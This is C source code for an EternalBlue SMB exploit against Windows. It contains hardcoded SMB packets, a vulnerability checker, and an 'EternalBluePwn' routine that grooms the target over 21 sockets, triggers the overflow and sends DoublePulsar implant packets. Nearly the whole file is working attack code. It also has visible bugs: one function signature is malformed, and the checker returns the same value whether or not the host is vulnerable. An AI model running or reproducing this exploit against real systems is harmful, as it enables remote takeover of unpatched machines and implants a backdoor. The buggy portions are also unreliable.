#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <tchar.h>
#pragma comment(lib, "wsock32.lib")
#include "Eternalblue.h"

unsigned char SmbNegociate[] =
"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x00"
"\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30"
"\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x88\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc0\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00"
"\x0d\xff\x00\x88\x00\x04\x11\x0a\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
"\x00\x00\x00\x00\x00\xd4\x00\x00\x00\x4b\x00\x00\x00\x00\x00\x00\x57\x00"
"\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00"
"\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00"
"\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00"
"\x30\x00\x30\x00\x20\x00\x35\x00\x2e\x00\x30\x00\x00\x00";

unsigned char treeConnectRequest[] = 
"\x00\x00\x00\x60\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
"\x00\x08\x40\x00\x04\xff\x00\x60\x00\x08\x00\x01\x00\x35\x00\x00"
"\x5c\x00\x5c\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00"
"\x38\x00\x2e\x00\x31\x00\x37\x00\x35\x00\x2e\x00\x31\x00\x32\x00"
"\x38\x00\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f\x3f\x00";

unsigned char transNamedPipeRequest[] = 
"\x00\x00\x00\x4a\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x01\x28\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x8e\xa3\x01\x08"
"\x52\x98\x10\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00\x02\x00\x23\x00\x00"
"\x00\x07\x00\x5c\x50\x49\x50\x45\x5c\x00";

void replacePlaceholderWithBytes(unsigned char* buffer, size_t bufferSize, const char* placeholder, unsigned char *newValue) {
    size_t placeholderLength = strlen(placeholder);
    size_t offset = 0;

    // Iterate through the buffer to find and replace the placeholder
    while (offset < bufferSize) {
        // Find the position of the placeholder in the remaining buffer
        void* position = memchr(buffer + offset, placeholder[0], bufferSize - offset);

        // If the placeholder is found, replace it with the new value
        if (position != NULL) {
            // Calculate the position relative to the entire buffer
            size_t absolutePosition = (unsigned char*)position - buffer;

            // Check if the remaining buffer is long enough to contain the placeholder
            if (absolutePosition + placeholderLength <= bufferSize) {
                // Allocate memory for the new string
                char* newString = (char*)malloc(bufferSize - placeholderLength + sizeof(unsigned char)*2 );

                // Copy the content before the placeholder
                memcpy(newString, buffer, absolutePosition);

                // Copy the two bytes of the new value as characters
                memcpy(newString + absolutePosition, (unsigned char*)newValue, sizeof(unsigned char)*2);

                // Copy the content after the placeholder
                memcpy(newString + absolutePosition + sizeof(unsigned char)*2, buffer + absolutePosition + placeholderLength,
                    bufferSize - absolutePosition - placeholderLength);

                // Update the original buffer with the new string
                memcpy(buffer, newString, bufferSize - placeholderLength + sizeof(WORD));

                // Free the allocated memory
                free(newString);

                // Move the offset to the end of the replaced portion
                offset = absolutePosition + sizeof(unsigned char)*2;
            }
            else {
                // If the remaining buffer is not long enough, exit the loop
                break;
            }
        }
        else {
            // If the placeholder is not found, exit the loop
            break;
        }
    }
}

//Usage: replace_SMB_values(SMB_Trans2_Packet, "__TREEID__PLACEHOLDER__", treeid);
//replace_SMB_values(SMB_Trans2_Packet, "__USERID__PLACEHOLDER__", userid);
int replace_SMB_values(unsigned char *smb_packet, const char placeholder, replacevalue)
{
    // Example SMB string to replace
	/*
    unsigned char smb_packet[] = "\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5F\x5F\x54\x52\x45\x45\x49\x44\x5F\x50\x4C\x41\x43\x45\x48\x4F\x4C\x44\x45\x52\x5F\x5F\xff\xfe"
        "\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
        "\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
        "\x00\x0e\x00\x0d\x10\x00"; */
    size_t bufferSize = sizeof(smb_packet) - 1; // Exclude the null terminator

    /*
     __USERID__PLACEHOLDER__
     __TREEID__PLACEHOLDER__
     __TREEPATH_REPLACE__
    */
    //const char placeholder[] = "__TREEID_PLACEHOLDER__";
    //unsigned char treeid[] = "\xA6\xFF";
	
    //unsigned char treeid[2];
    //treeid[0] = 0xA6;
    //treeid[1] = 0xF8;

    // Call the function to replace the placeholder with the new value
    replacePlaceholderWithBytes(smb_packet, bufferSize, placeholder, replacevalue);
    return 0;
}

int CheckForEternalBlue(char *host, int port)
{
    struct sockaddr_in server;
    SOCKET    sock;
    DWORD    ret;
    unsigned char recvbuff[2048];
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock <= 0)
    {
        return 1;
    }
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(host);
    server.sin_port = htons(port);
    ret = connect(sock, (struct sockaddr*)&server, sizeof(server));
    
    //send SMB negociate packet
    send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
    recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

    //send Session Setup AndX request
    ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
    if (ret <= 0)
    {
        return 1;
    }
    recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
    
    char userid[2];
    char treeid[2];
    //copy userID from recvbuff @ 32,33
    userid[0] = recvbuff[32];
    userid[1] = recvbuff[33];
    
    //update userID in the tree connect request
    treeConnectRequest[32] = userid[0];
    treeConnectRequest[33] = userid[1];

    //send TreeConnect request
    ret = send(sock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
    if (ret <= 0)
    {
        return 1;
    }
    recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

    //copy treeID from recvbuff @ 28, 29
    treeid[0] = recvbuff[28];
    treeid[1] = recvbuff[29];
    //update treeid & userid in the transNamedPipe Request
    transNamedPipeRequest[28] = treeid[0];
    transNamedPipeRequest[29] = treeid[1];
    transNamedPipeRequest[32] = userid[0];
    transNamedPipeRequest[33] = userid[1];

    //send transNamedPipe request
    ret = send(sock, (char*)transNamedPipeRequest, sizeof(transNamedPipeRequest) - 1, 0);
    if (ret <= 0)
    {
        return 1;
    }
    recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

    //compare the NT_STATUS response to 0xC0000205 ( STATUS_INSUFF_SERVER_RESOURCES)
    if (recvbuff[9] == 0x05 && recvbuff[10] == 0x02 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
    {
        closesocket(sock);
        return 1;
    }
    else
    {
        closesocket(sock);
        //not vulnerable
        return 1;
    }
}

int EternalBluePwn(char *host, int port)
{
	struct sockaddr_in server;
	SOCKET s1, s2, s3, s4, s5, s6, s7, s8, s9, s10, s11, s12, s13, s14, s15, s16, s17, s18, s19, s20, s21;

	char userid[2];
	char treeid[2];
  
	s1 = socket(AF_INET, SOCK_STREAM, 0);
	s2 = socket(AF_INET, SOCK_STREAM, 0);
	s3 = socket(AF_INET, SOCK_STREAM, 0);
	s4 = socket(AF_INET, SOCK_STREAM, 0);

	s5 = socket(AF_INET, SOCK_STREAM, 0);
	s6 = socket(AF_INET, SOCK_STREAM, 0);
	s7 = socket(AF_INET, SOCK_STREAM, 0);
	s8 = socket(AF_INET, SOCK_STREAM, 0);
	s9 = socket(AF_INET, SOCK_STREAM, 0);
	s10 = socket(AF_INET, SOCK_STREAM, 0);
	s11 = socket(AF_INET, SOCK_STREAM, 0);
	s12 = socket(AF_INET, SOCK_STREAM, 0);

	s13 = socket(AF_INET, SOCK_STREAM, 0);
	s14 = socket(AF_INET, SOCK_STREAM, 0);
	s15 = socket(AF_INET, SOCK_STREAM, 0);
	s16 = socket(AF_INET, SOCK_STREAM, 0);

	s17 = socket(AF_INET, SOCK_STREAM, 0);
	s18 = socket(AF_INET, SOCK_STREAM, 0);
	s19 = socket(AF_INET, SOCK_STREAM, 0);
	s20 = socket(AF_INET, SOCK_STREAM, 0);
	s21 = socket(AF_INET, SOCK_STREAM, 0);
	
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(host);
	server.sin_port = htons(port);
	
	connect(s1, (struct sockaddr*) & server, sizeof(server));

	//send negociation
	send(s1, (char*)smbnegociate, sizeof(smbnegociate) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	send(s1, (char*)session_setup, sizeof(session_setup) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);
	userid[0] = recvbuff[32];
	userid[1] = recvbuff[33];

	//update userID in the tree connect request
	treeconnect[32] = userid[0];
	treeconnect[33] = userid[1];

	send(s1, (char*)treeconnect, sizeof(treeconnect) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);
	//copy treeID from recvbuff @ 28, 29
	treeid[0] = recvbuff[28];
	treeid[1] = recvbuff[29];

	send(s1, (char*)NTTrans, sizeof(NTTrans) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	send(s1, (char*)NTTrans2, sizeof(NTTrans2) - 1, 0);

	send(s1, (char*)NTTrans3, sizeof(NTTrans3) - 1, 0);

	send(s1, (char*)NTTrans4, sizeof(NTTrans4) - 1, 0);

	send(s1, (char*)NTTrans5, sizeof(NTTrans5) - 1, 0);

	send(s1, (char*)NTTrans6, sizeof(NTTrans6) - 1, 0);

	send(s1, (char*)NTTrans7, sizeof(NTTrans7) - 1, 0);

	send(s1, (char*)NTTrans8, sizeof(NTTrans8) - 1, 0);

	send(s1, (char*)NTTrans9, sizeof(NTTrans9) - 1, 0);

	send(s1, (char*)NTTrans10, sizeof(NTTrans10) - 1, 0);

	send(s1, (char*)NTTrans11, sizeof(NTTrans11) - 1, 0);

	send(s1, (char*)NTTrans12, sizeof(NTTrans12) - 1, 0);

	send(s1, (char*)NTTrans13, sizeof(NTTrans13) - 1, 0);

	send(s1, (char*)NTTrans14, sizeof(NTTrans14) - 1, 0);

	send(s1, (char*)NTTrans15, sizeof(NTTrans15) - 1, 0);

	send(s1, (char*)NTTrans16, sizeof(NTTrans16) - 1, 0);

	send(s1, (char*)NTTrans17, sizeof(NTTrans17) - 1, 0);

	send(s1, (char*)NTTrans18, sizeof(NTTrans18) - 1, 0);

	send(s1, (char*)NTTrans19, sizeof(NTTrans19) - 1, 0);

	send(s1, (char*)NTTrans20, sizeof(NTTrans20) - 1, 0);

	send(s1, (char*)NTTrans21, sizeof(NTTrans21) - 1, 0);

	send(s1, (char*)NTTrans22, sizeof(NTTrans22) - 1, 0);

	send(s1, (char*)NTTrans23, sizeof(NTTrans23) - 1, 0);

	send(s1, (char*)NTTrans24, sizeof(NTTrans24) - 1, 0);

	send(s1, (char*)NTTrans25, sizeof(NTTrans25) - 1, 0);

	send(s1, (char*)NTTrans26, sizeof(NTTrans26) - 1, 0);

	send(s1, (char*)NTTrans27, sizeof(NTTrans27) - 1, 0);
	send(s1, (char*)NTTrans28, sizeof(NTTrans28) - 1, 0);

	send(s1, (char*)NTTrans29, sizeof(NTTrans29) - 1, 0);

	send(s1, (char*)NTTrans30, sizeof(NTTrans30) - 1, 0);

	send(s1, (char*)NTTrans31, sizeof(NTTrans31) - 1, 0);

	send(s1, (char*)NTTrans32, sizeof(NTTrans32) - 1, 0);

	send(s1, (char*)NTTrans33, sizeof(NTTrans33) - 1, 0);
	
	send(s1, (char*)NTTrans34, sizeof(NTTrans34) - 1, 0);

	send(s1, (char*)NTTrans35, sizeof(NTTrans35) - 1, 0);
	
	send(s1, (char*)NTTrans36, sizeof(NTTrans36) - 1, 0);

	send(s1, (char*)NTTrans37, sizeof(NTTrans37) - 1, 0);
	
	send(s1, (char*)NTTrans38, sizeof(NTTrans38) - 1, 0);
	send(s1, (char*)NTTrans39, sizeof(NTTrans39) - 1, 0);
	
	send(s1, (char*)NTTrans40, sizeof(NTTrans40) - 1, 0);
	
	send(s1, (char*)NTTrans41, sizeof(NTTrans41) - 1, 0);
	
	send(s1, (char*)NTTrans42, sizeof(NTTrans42) - 1, 0);
	
	send(s1, (char*)NTTrans43, sizeof(NTTrans43) - 1, 0);
	
	send(s1, (char*)NTTrans44, sizeof(NTTrans44) - 1, 0);

	send(s1, (char*)NTTrans45, sizeof(NTTrans45) - 1, 0);
	
	send(s1, (char*)NTTrans46, sizeof(NTTrans46) - 1, 0);

	send(s1, (char*)SmbEcho, sizeof(SmbEcho) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	//connect to second socket
	connect(s2, (struct sockaddr*) & server, sizeof(server));
	send(s2, (char*)negociate2, sizeof(negociate2) - 1, 0);
	recv(s2, (char*)recvbuff, sizeof(recvbuff), 0);

	send(s2, (char*)unknown_packet_socket2, sizeof(unknown_packet_socket2) - 1, 0);
	recv(s2, (char*)recvbuff, sizeof(recvbuff), 0);

	connect(s3, (struct sockaddr*) & server, sizeof(server));
	connect(s4, (struct sockaddr*) & server, sizeof(server));

	send(s3, (char*)unknown_packet_socket3, sizeof(unknown_packet_socket3) - 1, 0);
	
	connect(s5, (struct sockaddr*) & server, sizeof(server));

	send(s4, (char*)unknown_packet_socket4, sizeof(unknown_packet_socket4) - 1, 0);

	send(s5, (char*)unknown_packet_socket5, sizeof(unknown_packet_socket5) - 1, 0);

	connect(s6, (struct sockaddr*) & server, sizeof(server));
	send(s6, (char*)unknown_packet_socket5, sizeof(unknown_packet_socket5) - 1, 0);

	connect(s7, (struct sockaddr*) & server, sizeof(server));
	connect(s8, (struct sockaddr*) & server, sizeof(server));
	send(s7, (char*)unknown_packet_socket7, sizeof(unknown_packet_socket7) - 1, 0);

	send(s8, (char*)unknown_packet_socket8, sizeof(unknown_packet_socket8) - 1, 0);

	connect(s9, (struct sockaddr*) & server, sizeof(server));
	connect(s10, (struct sockaddr*) & server, sizeof(server));

	send(s9, (char*)unknown_packet_socket9, sizeof(unknown_packet_socket9) - 1, 0);
	send(s10, (char*)unknown_packet_socket10, sizeof(unknown_packet_socket10) - 1, 0);

	connect(s11, (struct sockaddr*) & server, sizeof(server));
	connect(s12, (struct sockaddr*) & server, sizeof(server));
	send(s11, (char*)unknown_packet_socket11, sizeof(unknown_packet_socket11) - 1, 0);

	connect(s13, (struct sockaddr*) & server, sizeof(server));

	send(s12, (char*)unknown_packet_socket12, sizeof(unknown_packet_socket12) - 1, 0);

	connect(s14, (struct sockaddr*) & server, sizeof(server));

	send(s13, (char*)unknown_packet_socket13, sizeof(unknown_packet_socket13) - 1, 0);
	
	connect(s15, (struct sockaddr*) & server, sizeof(server));

	send(s14, (char*)unknown_packet_socket14, sizeof(unknown_packet_socket14) - 1, 0);

	connect(s16, (struct sockaddr*) & server, sizeof(server));

	send(s15, (char*)unknown_packet_socket15, sizeof(unknown_packet_socket15) - 1, 0);

	send(s16, (char*)negociate_socket16, sizeof(negociate_socket16) - 1, 0);
	recv(s16, (char*)recvbuff, sizeof(recvbuff), 0);

	send(s16, (char*)unknown_packet_socket16, sizeof(unknown_packet_socket16) - 1, 0);
	//get information
	recv(s16, (char*)recvbuff, sizeof(recvbuff), 0);

	closesocket(s2);

	connect(s17, (struct sockaddr*) & server, sizeof(server));
	send(s17, (char*)unknown_packet_socket17, sizeof(unknown_packet_socket17) - 1, 0);

	connect(s18, (struct sockaddr*) & server, sizeof(server));
	connect(s19, (struct sockaddr*) & server, sizeof(server));

	send(s18, (char*)unknown_packet_socket18, sizeof(unknown_packet_socket18) - 1, 0);

	connect(s20, (struct sockaddr*) & server, sizeof(server));
	send(s19, (char*)unknown_packet_socket19, sizeof(unknown_packet_socket19) - 1, 0);

	connect(s21, (struct sockaddr*) & server, sizeof(server));
	send(s20, (char*)unknown_packet_socket20, sizeof(unknown_packet_socket20) - 1, 0);
	send(s21, (char*)unknown_packet_socket21, sizeof(unknown_packet_socket21) - 1, 0);

	closesocket(s16);

	send(s1, (char*)smbecho_socket1, sizeof(smbecho_socket1) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	send(s1, (char*)last_eternalblue_packet, sizeof(last_eternalblue_packet) - 1, 0);
	send(s1, (char*)last_eternalblue_packet2, sizeof(last_eternalblue_packet2) - 1, 0);
	send(s1, (char*)last_eternalblue_packet3, sizeof(last_eternalblue_packet3) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	//check for EternalBlue overwrite in response packet
	if (recvbuff[9] == 0x0d && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
	{
		//printf("Got STATUS_INVALID_PARAMETER!  EternalBlue overwrite successful!\n");
		//looking good so far if we reached this point
	}

	//send doublepulsar packets
	send(s3, (char*)doublepulsar_packet_socket3, sizeof(doublepulsar_packet_socket3) - 1, 0);
	send(s3, (char*)doublepulsar_packet2_socket3, sizeof(doublepulsar_packet2_socket3) - 1, 0);

	send(s4, (char*)doublepulsar_packet_socket4, sizeof(doublepulsar_packet_socket4) - 1, 0);
	send(s4, (char*)doublepulsar_packet2_socket4, sizeof(doublepulsar_packet2_socket4) - 1, 0);

	send(s5, (char*)doublepulsar_packet_socket5, sizeof(doublepulsar_packet_socket5) - 1, 0);
	send(s5, (char*)doublepulsar_packet2_socket5, sizeof(doublepulsar_packet2_socket5) - 1, 0);

	send(s6, (char*)doublepulsar_packet_socket6, sizeof(doublepulsar_packet_socket6) - 1, 0);
	send(s6, (char*)doublepulsar_packet2_socket6, sizeof(doublepulsar_packet2_socket6) - 1, 0);
	send(s7, (char*)doublepulsar_packet_socket7, sizeof(doublepulsar_packet_socket7) - 1, 0);
	send(s7, (char*)doublepulsar_packet2_socket7, sizeof(doublepulsar_packet2_socket7) - 1, 0);
	send(s8, (char*)doublepulsar_packet_socket8, sizeof(doublepulsar_packet_socket8) - 1, 0);
	send(s8, (char*)doublepulsar_packet2_socket8, sizeof(doublepulsar_packet2_socket8) - 1, 0);
	send(s9, (char*)doublepulsar_packet_socket9, sizeof(doublepulsar_packet_socket9) - 1, 0);
	send(s9, (char*)doublepulsar_packet2_socket9, sizeof(doublepulsar_packet2_socket9) - 1, 0);
	send(s10, (char*)doublepulsar_packet_socket10, sizeof(doublepulsar_packet_socket10) - 1, 0);
	send(s10, (char*)doublepulsar_packet2_socket10, sizeof(doublepulsar_packet2_socket10) - 1, 0);
	send(s11, (char*)doublepulsar_packet_socket11, sizeof(doublepulsar_packet_socket11) - 1, 0);
	send(s11, (char*)doublepulsar_packet2_socket11, sizeof(doublepulsar_packet2_socket11) - 1, 0);
	send(s12, (char*)doublepulsar_packet_socket12, sizeof(doublepulsar_packet_socket12) - 1, 0);
	send(s12, (char*)doublepulsar_packet2_socket12, sizeof(doublepulsar_packet2_socket12) - 1, 0);
	send(s13, (char*)doublepulsar_packet_socket13, sizeof(doublepulsar_packet_socket13) - 1, 0);
	send(s13, (char*)doublepulsar_packet2_socket13, sizeof(doublepulsar_packet2_socket13) - 1, 0);
	send(s14, (char*)doublepulsar_packet_socket14, sizeof(doublepulsar_packet_socket14) - 1, 0);
	send(s14, (char*)doublepulsar_packet2_socket14, sizeof(doublepulsar_packet2_socket14) - 1, 0);
	send(s15, (char*)doublepulsar_packet_socket15, sizeof(doublepulsar_packet_socket15) - 1, 0);
	send(s15, (char*)doublepulsar_packet2_socket15, sizeof(doublepulsar_packet2_socket15) - 1, 0);

	send(s17, (char*)doublepulsar_packet_socket17, sizeof(doublepulsar_packet_socket17) - 1, 0);
	send(s17, (char*)doublepulsar_packet2_socket17, sizeof(doublepulsar_packet2_socket17) - 1, 0);
	send(s18, (char*)doublepulsar_packet_socket18, sizeof(doublepulsar_packet_socket18) - 1, 0);
	send(s18, (char*)doublepulsar_packet2_socket18, sizeof(doublepulsar_packet2_socket18) - 1, 0);
	send(s19, (char*)doublepulsar_packet_socket19, sizeof(doublepulsar_packet_socket19) - 1, 0);
	send(s19, (char*)doublepulsar_packet2_socket19, sizeof(doublepulsar_packet2_socket19) - 1, 0);
	send(s20, (char*)doublepulsar_packet_socket20, sizeof(doublepulsar_packet_socket20) - 1, 0);
	send(s20, (char*)doublepulsar_packet2_socket20, sizeof(doublepulsar_packet2_socket20) - 1, 0);

	send(s21, (char*)doublepulsar_packet_socket21, sizeof(doublepulsar_packet_socket21) - 1, 0);
	send(s21, (char*)doublepulsar_packet2_socket21, sizeof(doublepulsar_packet2_socket21) - 1, 0);

	//send doublepulsar packets
	send(s3, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s4, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s5, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s6, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s7, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s8, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s9, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s10, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s11, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s12, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s13, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s14, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s15, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	//closed socket 16 already
	send(s17, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s18, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s19, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s20, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s21, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);

	//mass close sockets
	closesocket(s3);
	closesocket(s4);
	closesocket(s5);
	closesocket(s6);
	closesocket(s7);
	closesocket(s8);
	closesocket(s9);
	closesocket(s10);
	closesocket(s11);
	closesocket(s12);
	closesocket(s13);
	closesocket(s14);
	closesocket(s15);
	closesocket(s17);

	//send disconnect
	send(s1, (char*)disconnect, sizeof(disconnect) - 1, 0);

	closesocket(s18);
	closesocket(s19);
	closesocket(s20);
	closesocket(s21);

	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	//send logoff
	send(s1, (char*)logoff, sizeof(logoff) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	//close first socket
	closesocket(s1);

	//cleanup
	return 0;
}
